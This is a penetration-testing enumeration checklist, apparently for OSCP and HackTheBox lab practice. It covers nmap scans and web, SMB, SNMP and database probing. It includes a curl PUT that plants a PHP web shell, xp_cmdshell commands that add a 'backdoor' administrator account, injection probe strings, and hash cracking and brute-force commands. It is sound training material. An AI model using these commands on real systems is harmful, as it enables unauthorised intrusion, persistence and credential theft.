Most of this is taken from https://theslickgeek.com/oscp/, some things have been added and thank you @theslickgeek for everything. You can use this as a checklist for enumerating some common services running on machines.


### Step 1: Initial nmap scans.
```
Nmap -Pn -p- -vv <ip address>

Nmap -Pn -p- -sU -vv <ip address>

nmap -v -Pn -sC -sV -oA nmap <ip address>
```


### Step 2: Nmap version and vulnerability Scan:
```
Nmap -Pn -sV -sC -O -pT:{TCP ports found in step 1},U:{UDP ports found in step 1} 
```
Grab banners manually for more clarity: ```nc -nv <ip-address> <port>```

Onetwopunch here if we think we missed some ports or want to be really fast
https://github.com/superkojiman/onetwopunch

To automate this, try https://github.com/codingo/Reconnoitre or Sparta.


### Step 3: Any web port(s) for further enumeration?
Start with nikto in the background I guess...
```
Nikto -port {web ports} -host <ip address> -o <output file.txt>
```
Run NSE scripts as needed
```
nmap -n -sV -Pn -p 80,443,8080 --script=http-enum,http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt,http-iis-webdav-vuln,http-vuln-cve2009-3960,http-vuln-cve2010-0738,http-vuln-cve2011-3368,http-vuln-cve2012-1823,http-vuln-cve2013-0156,http-waf-detect,http-waf-fingerprint,ssl-enum-ciphers,ssl-known-key -oA web 10.10.10.10
```
Run Dirsearch with the default list for quick start, then move into bigger lists with Gobuster or whatever you like.
https://github.com/maurosoria/dirsearch
```
Dirb http{s}://<ip address>:<port> /usr/share/wordlist/dirb/{common/small/vulns}.txt

Gobuster -u http://<ip-address> -w /usr/share/dirbuster/wordlists/directory-list-2.3.medium.txt -t 80

wfuzz -z file,/opt/SecLists/Discovery/Web_Content/common.txt --hs 404 http://1.1.1.1/FUZZ
```
Order of lists to use when in dirbuster hell, if none of these get anything its likely something else to move forward on hackthebox or other challenges...
```
dirsearch default list
/dirbuster/2.3-medium..
/dirb/common.txt
/dirb/big.txt
/seclists/raft-large-directories/words/files
more from /seclists/Discovery...
```

Use Burpsuite as needed

Do you see any LFI/RFI vulnerability? Try fimap and Kadimus: ```fimap -u <ip-address>```
https://github.com/P0cL4bs/Kadimus

Start adding strings, custom content, accounts, passwords, comments, directories, or whatever else to a wordlist...


### Step 4: Are there any exploits available publicly from the services discovered from Step 2?

Run Searchsploit...

http://www.securityfocus.com/vulnerabilities

Copy exploit to local dir: ```searchsploit -m <ID>```

google exploitdb **serviceversion**

check found exploits for Metasploit versions could make things easier


### Step 5: Manual Poking for Web Pages /w Burp running

Check the page source, inspect elements, view cookies, tamper data, use curl/wget, burp site mapper...

Google alien terms!
Anything sensitive there?
Any version info?
Search online and on Github for the software source to try and to guess versions etc.
Check HTTP Options
``` 
curl -v -X OPTIONS 10.10.10.1
curl -X PUT -d '<?php system($_GET["c"]);' http://10.10.10.1/test/1.php
```
Check for Input Validation in forms (like: 1′ or 1=1 limit 1;#   AND   1′ or 1=1–)
```
NULL or null
Possible error messages returned.
‘ , ” , ; , <!
Breaks an SQL string or query; used for SQL, XPath and XML Injection tests.
– , = , + , ”
Used to craft SQL Injection queries.
‘ , &, ! , ¦ , < , >, |, &&, ;
Used to find command execution vulnerabilities.
../ ..\ 
Directory Traversal Vulnerabilities.
```

wfuzz  has some nice wordlists for potential cmd injection...


### Step 6: Are there any NETBIOS, SMB, RPC ports discovered from Step 1?
Start withe the basics and make sure you check the version that is running...
```
enum4linux -a 10.10.10.10

nmap -n -sV -sU -sS -Pn -pT:139,445,U:137 --script=nbstat,smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-sessions,smb-ls,smb-mbenum,smb-os-discovery,smb-print-text,smb-security-mode,smb-server-stats,smb-system-info,smb-vuln-conficker,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-vuln-ms10-061 -oA smb 10.10.10.10

Rpcclient 10.10.10.10 -U “” -N
```
You should be able to find the version of a server with nmap smb-os-discovery nse script or Impacket Smbclient.

Rpcinfo: What services are running? ```Rpcinfo -p <target ip>```

Is portmapper running? Is rlogin running? Or NFS or Mountd?

```Showmount -e/-a/-d <ip address>/<port>``` or showmount nse script

Can you run smbmap?

Can you mount the smb share locally? 

```
Mount -t cifs //<server ip>/<share> <local dir> -o username=”guest”,password=””

Rlogin <ip-address>

Impacket Smbclient or Smbclient -L \\<ip-address> -U “” -N 

Nbtscan -r <ip address>

Net use \\<ip-address>\$Share “” /u:””

Net view \\<ip-address>

nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script "not brute and not dos and smb-*" -vv
```


### Step 7: SMTP

Enumerate users on the system mostly and read their mail. PentestMonkey smtp-user-enum script is easymode here. http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum

VRFY username (verifies if username exists – enumeration of accounts)
EXPN username (verifies if username is valid – enumeration of accounts)

Always try NSE scripts
```
nmap -n -sV -sT -Pn -p 25,465,587 --script=smtp-commands,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1764 -oA smtp 10.10.10.10
```

### Step 8: SNMP 

Default Community Names: public, private, cisco, manager

Enumerate MIB:

1.3.6.1.2.1.25.1.6.0 System Processes

1.3.6.1.2.1.25.4.2.1.2 Running Programs

1.3.6.1.2.1.25.4.2.1.4 Processes Path

1.3.6.1.2.1.25.2.3.1.4 Storage Units

1.3.6.1.2.1.25.6.3.1.2 Software Name

1.3.6.1.4.1.77.1.2.25 User Accounts

1.3.6.1.2.1.6.13.1.3 TCP Local Ports

Eg: enumerating running programs:

```snmpwalk -c public -v1 10.10.10.10 1.3.6.1.2.1.25.4.2.1.2```

Other tools:
```
Onesixtyone – c <community list file> -I <ip-address>

Snmpwalk -c <community string> -v<version> <ip address>

nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes -oA snmp 10.10.10.10 
```

### Step 9: FTP Ports Discovered

Is anonymous login allowed?

If yes, is directory listing possible? Can you ‘get’ or ‘send’ a file?

Use browser: ftp://<ip-address> , What do you find?
```
nmap -sV -Pn -n -p 21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oA ftp 10.10.10.10 
```

### Step 10: Mysql

Check for default/anonymous logons

NSE scripts 
```
nmap -n -sV -Pn -p 3306 --script=mysql-audit,mysql-brute,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 -oA mysql 10.10.10.10
```

### Step 11: Mssql

Check for default/crap passwords and installed version

NSE scripts 
```
nmap -n -sV -sT -Pn -p 1433 --script=ms-sql-brute,ms-sql-config,ms-sql-dac,ms-sql-dump-hashes,ms-sql-empty-password,ms-sql-hasdbaccess,ms-sql-info,ms-sql-query,ms-sql-tables,ms-sql-xp-cmdshell -oA mssql 10.10.10.10
```
If we have credentials, you can exec commands with nmap
```
nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse 10.10.10.10 -p1433 --script-args mssql.username=sa,mssql.password=<sql_password>,ms-sql-xp-cmdshell.cmd="net user backdoor backdoor123 /add"
nmap -Pn -n -sS --script=ms-sql-xp-cmdshell.nse 10.10.10.10 -p1433 --script-args mssql.username=<sql_user>,mssql.password=<sql_password>,ms-sql-xp-cmdshell.cmd="net localgroup administrators backdoor /add"
```
You can use Impacket mssqlclient
```
mssqlclient.py sa:crapass@10.10.10.10
```

Or use sqsh...
```
sqsh -S <ip_address> -U sa -P <password>
```
And then...
```
exec sp_configure ‘show advanced options’, 1
go
reconfigure
go
exec sp_configure ‘xp_cmdshell’, 1
go
reconfigure
go
xp_cmdshell 'dir C:\'
go
```

### Step 12: Oracle

NSE scripts 
```
nmap -n -sV -sT -Pn -p 1521 --script=oracle-brute.nse,oracle-brute-stealth.nse,oracle-enum-users.nse,oracle-sid-brute -oA oracle 10.10.10.10
```

### Step 13: RDP and VNC

NSE scripts 
```
nmap -Pn -sV -p 3389 --script=rdp-enum-encryption,rdp-vuln-ms12-020.nse -oA rdp 10.10.10.10
nmap -n -sV -sT -Pn -p 5900 --script=realvnc-auth-bypass,vnc-brute,vnc-info --script-args=unsafe=1 -oA vnc 10.10.10.10
```
Try bruting with Ncrack or Crowbar as a last resort

### Step 14: Password Cracking / Brute Forcing

Try this if the Passwd/Shadow/SAM files are in possession:

For linux, first combine passwd & shadow files: ``` unshadow [passwd-file] [shadow-file] > unshadowed.txt```

Then, use John on the unshadowed file using a wordlist or rules mangling :``` john –rules –wordlist=<wordlist file> unshadowed.txt```

Identifying Hash: hash-identifier and hashid

For other services, use Medusa, Hydra, Patator, Crowbar. Eg:
```
Hydra -L <username file> -P <Password file> -v <ip-address> ssh

Medusa -h <ip-address> -U <username file> -P <password file> -M http -m DIR:/admin -T 30
```
Using hashcat for cracking hashes:

For WordPress MD5 with salt:``` hashcat -m 400 -a 0 <hash file> <wordlist file>```

Start with the rockyou list. If not in there move onto the Seclists passwords folder...


### Step 15: Packet Sniffing

Use Wireshark / tcpdump / metasploit sniffer to capture traffic on the target host:

```tcpdump -i tap0  host <target-ip> tcp port 80 and not arp and not icmp -vv```


### Step 16: Other Services 

Some must see links that go deeper on other more obscure services you will see:

https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html

http://www.0daysecurity.com/penetration-testing/enumeration.html

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/

https://netsec.ws/?p=536

